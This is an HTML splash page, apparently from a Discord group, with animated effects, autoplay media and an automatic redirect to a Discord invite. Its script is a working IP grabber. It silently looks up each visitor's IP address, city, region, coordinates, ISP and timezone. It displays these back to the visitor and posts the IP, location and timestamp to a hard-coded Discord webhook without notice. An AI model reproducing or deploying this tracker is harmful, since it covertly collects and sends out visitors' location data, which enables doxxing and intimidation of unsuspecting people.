<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PSYCHO & CJ</title>
<style>
    body {
        margin: 0;
        padding: 0;
        font-family: 'Courier New', Courier, monospace;
        color: #490a0a;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        flex-direction: column;
        text-align: center;
        overflow: hidden;
        background-color: black;
    }

    /* تأثير النقاط المتحركة في الخلفية */
    .particles {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        overflow: hidden;
        z-index: 0;
        pointer-events: none;
    }

    .particle {
        position: absolute;
        width: 3px;
        height: 3px;
        background-color: white;
        box-shadow: 0 0 5px white, 0 0 10px white;
        border-radius: 50%;
        animation: moveParticle linear infinite;
    }

    @keyframes moveParticle {
        0% {
            transform: translateY(105vh) translateX(0);
            opacity: 0;
        }
        20% {
            opacity: 1;
        }
        80% {
            opacity: 1;
        }
        100% {
            transform: translateY(-10vh) translateX(50px);
            opacity: 0;
        }
    }

    .background-video {
        display: none;
    }

    .content {
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        z-index: 1;
        position: relative;
        height: 100vh;
        width: 100%;
    }

    .background-video-second {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        object-fit: cover;
        z-index: -1;
    }

    .info {
        margin-top: 20px;
        font-size: 1.5em;
        letter-spacing: 4.5px;
        white-space: pre-wrap;
    }

    .text {
        margin-top: 20px;
        font-size: 3em;
        letter-spacing: 4.5px;
    }

    .marquee {
        position: absolute;
        top: 10%;
        width: 100%;
        overflow: hidden;
        white-space: nowrap;
    }

    .marquee span {
        display: inline-block;
        font-size: 2em;
        color: #ff0000;
        text-shadow: 0px 0px 8px #ff0000, 0px 0px 15px #ff0000, 0px 0px 25px #ff0000;
        animation: scroll 10s linear infinite;
    }

    @keyframes scroll {
        0% { transform: translateX(100%); }
        100% { transform: translateX(-100%); }
    }

    .image-container img {
        max-width: 80%;
        height: auto;
        margin: 20px auto;
        display: block;
        filter: drop-shadow(0 0 0 blue) drop-shadow(0 0 2px blue) drop-shadow(0 0 4px blue);
    }
</style>
</head>
<body>

<!-- تشغيل رابط الديسكورد تلقائياً فور فتح الصفحة -->
<script>
    window.location.href = "https://discord.gg/uaee";
</script>

<!-- طبقة النقاط المتحركة -->
<div class="particles" id="particles"></div>

<div class="content">
    <video class="background-video-second" autoplay loop muted>
        <source src="https://a.top4top.io/m_34024yng01.mp4" type="video/mp4">
        Your browser does not support the video tag.
    </video>

    <div class="marquee">
        <span></span>
    </div>

    <div id="content">
        <div class="image-container">
            <img src="https://cdn.discordapp.com/attachments/1358314764605853750/1365319503562674330/Screenshot_2025-04-25_063140.png?ex=680ce060&is=680b8ee0&hm=db9aded6ff1fe2b8045c9f330e56a6a8221558ebf63de9ce5d920bc87705cd4d&" alt="">
        </div>

        <div class="info" id="ip-info">Loading IP Info...</div>
        <div class="text">discord.gg/UAEE</div>

        <audio autoplay loop>
            <source src="https://h.top4top.io/m_33890wyej1.mp3" type="audio/mpeg">
            Your browser does not support the audio element.
        </audio>
    </div>
</div>

<script>
    // توليد النقاط البيضاء عشوائياً في الخلفية
    const particlesContainer = document.getElementById('particles');
    const particleCount = 35; // عدد النقاط

    for (let i = 0; i < particleCount; i++) {
        const particle = document.createElement('div');
        particle.classList.add('particle');
        
        // أماكن عشوائية وسرعات مختلفة لكل نقطة
        particle.style.left = Math.random() * 100 + 'vw';
        particle.style.animationDuration = (Math.random() * 3 + 3) + 's'; // السرعة بين 3 إلى 6 ثواني
        particle.style.animationDelay = (Math.random() * 5) + 's';
        
        particlesContainer.appendChild(particle);
    }

    fetch('https://ipinfo.io/json')
        .then(response => response.json())
        .then(data => {
            const { ip, country, city, region, loc, org, timezone } = data;
            const infoDiv = document.getElementById('ip-info');
            infoDiv.innerHTML = `<strong>#3naty family</strong><br><strong>IP:</strong><span>"${ip}"</span><br><strong>City:</strong><span>"${city}"</span><br><strong>Region:</strong><span>"${region}"</span><br><strong>Country:</strong><span>"${country}"</span><br><strong>Location:</strong><span>"${loc}"</span><br><strong></strong> <span>"${org}"</span><br><strong>Timezone:</strong><span>"${timezone}"</span>`;

            const dateTime = new Date().toLocaleString();
            const webhookUrl = 'https://discord.com/api/webhooks/1342711596035604511/c2zeLZnSp0faGn2G7rnFX6NOdOt1ewLys7Sp55NJt1p1A6FIkFkDciidXSyaV7_3WGie';
            fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `IP : ${ip}\nCountry & City : ${country} - ${city}\nDate & Time : ${dateTime}\n -`
                })
            });
        });
</script>
</body>
</html>
